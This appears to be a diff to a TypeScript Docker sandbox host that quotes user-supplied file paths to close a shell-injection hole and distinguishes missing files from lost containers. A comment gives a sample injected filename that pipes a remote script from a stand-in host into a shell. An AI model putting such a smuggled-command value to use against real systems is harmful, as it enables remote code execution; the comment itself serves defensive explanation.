@@ -1,5 +1,6 @@
 import { FactoryError } from '@factory/shared';
 import { TIMEOUT_EXIT_CODE } from '../engines/limits';
+import { quoteOne } from './shell';
 
 /**
  * The container host, behind one interface. The Runner is the only component
@@ -9,11 +10,26 @@ import { TIMEOUT_EXIT_CODE } from '../engines/limits';
 
 export interface ContainerSpec {
   image: string;
-  /** Ceilings from the workspace settings (FR-085). */
+  /**
+   * Ceilings from the workspace settings (FR-085). Upper bounds on what a run
+   * may consume, never minimums: an execution host that offers fixed
+   * allocations gives the largest that fits WITHIN these, and refuses to
+   * create a sandbox at all when none does (002 FR-005, FR-009).
+   */
   cpu: number;
   memoryMb: number;
+  /** Not quantised: enforced exactly, by the host itself (002 FR-009a, FR-010). */
   wallClockMinutes: number;
-  /** Network reach while code is being written (FR-085). */
+  /**
+   * Whether the workspace asked for the network restriction (FR-085).
+   *
+   * Whether a host can ENFORCE it is a different question, and not one a spec
+   * can answer: 002 T006 measured that the intended hosted execution host
+   * cannot filter a sandbox's traffic by host in either direction, so on that
+   * host reach is all-or-nothing and this flag records an intent it cannot
+   * honour. 002 FR-011a requires such a host to say so rather than accept a
+   * value it will ignore.
+   */
   network: boolean;
   /** Credentials arrive as environment, never as files (FR-083). */
   env: Record<string, string>;
@@ -87,9 +103,14 @@ export const dockerHost: ContainerHost = {
   },
 
   async writeFile(containerId, path, content) {
-    const result = await run('docker', ['exec', '-i', containerId, 'sh', '-c', `cat > '${path}'`], {
-      stdin: content,
-    });
+    // `path` is data — a step's required documents are typed into the pipeline
+    // builder, so an unquoted interpolation here would let a document named
+    // `a'; curl evil.sh | sh; '.md` run whatever it liked (FR-015).
+    const result = await run(
+      'docker',
+      ['exec', '-i', containerId, 'sh', '-c', `cat > ${quoteOne(path)}`],
+      { stdin: content },
+    );
     if (result.exitCode !== 0) {
       throw new FactoryError('sandbox_lost', `could not write ${path}`, {
         detail: result.stderr.trim(),
@@ -99,7 +120,15 @@ export const dockerHost: ContainerHost = {
 
   async readFile(containerId, path) {
     const result = await run('docker', ['exec', containerId, 'cat', path]);
-    return result.exitCode === 0 ? result.stdout : null;
+    if (result.exitCode === 0) return result.stdout;
+    // A missing document and a lost sandbox are different answers, and this
+    // used to give the same one for both (F2). The consequence was specific:
+    // a step whose sandbox died mid-run reported its required document as not
+    // produced, so the run failed for the wrong reason and a retry looked
+    // pointless. `docker exec` fails for either cause, so the container has to
+    // be asked which it was.
+    await assertContainerAlive(containerId, path);
+    return null;
   },
 
   async stat(containerId, path) {
@@ -108,17 +137,57 @@ export const dockerHost: ContainerHost = {
       containerId,
       'sh',
       '-c',
-      `test -f '${path}' && wc -c < '${path}'`,
+      // Same reason as writeFile: this path came from a person (FR-015).
+      `test -f ${quoteOne(path)} && wc -c < ${quoteOne(path)}`,
     ]);
-    if (result.exitCode !== 0) return null;
-    const size = Number(result.stdout.trim());
-    return Number.isFinite(size) ? { size } : null;
+    if (result.exitCode === 0) {
+      const size = Number(result.stdout.trim());
+      return Number.isFinite(size) ? { size } : null;
+    }
+    // `test -f` exits 1 for a missing path, which is indistinguishable from
+    // `docker exec` failing because there is no container. Same question,
+    // same answer as readFile (F3).
+    await assertContainerAlive(containerId, path);
+    return null;
   },
 
   async destroy(containerId) {
     await run('docker', ['rm', '--force', containerId]);
   },
 };
+
+/**
+ * Throws `sandbox_lost` if the container is not running, and returns quietly if
+ * it is (F2, F3).
+ *
+ * Called only on the failure path of a read. That path is not rare — asking
+ * whether a step produced its required document is an ordinary absent read — so
+ * this costs one extra `docker inspect` per missing file, which is a cheap
+ * price for the distinction it buys: `null` means "that file is not there" and
+ * never "there is nowhere to look". Which is the difference between a step that
+ * failed to produce its document and a run that should be rebuilt from its last
+ * commit by `withSandboxRecovery`.
+ *
+ * A container that has stopped for any reason counts as lost, including one
+ * that exited on its own wall-clock `sleep`: from a caller's point of view
+ * there is no sandbox either way.
+ */
+async function assertContainerAlive(containerId: string, path: string): Promise<void> {
+  // Anything that stops us CONFIRMING the container is up counts as lost,
+  // including the daemon itself being unreachable — `Bun.spawn` throws outright
+  // when there is no `docker` to run at all. The conservative answer is the
+  // right one here: recovery rebuilds the sandbox once and resumes from the
+  // branch, which is correct if it really is gone and harmless if the read was
+  // simply of a file that was never written.
+  const state = await run('docker', ['inspect', '--format', '{{.State.Running}}', containerId])
+    .then((probe) => (probe.exitCode === 0 ? probe.stdout.trim() : probe.stderr.trim()))
+    .catch((error) => (error instanceof Error ? error.message : String(error)));
+  if (state !== 'true') {
+    throw new FactoryError('sandbox_lost', `the sandbox is gone, so ${path} could not be read`, {
+      detail: state,
+    });
+  }
+}
 
 /**
  * Exported so the deadline can be proven against a real process. An agent's
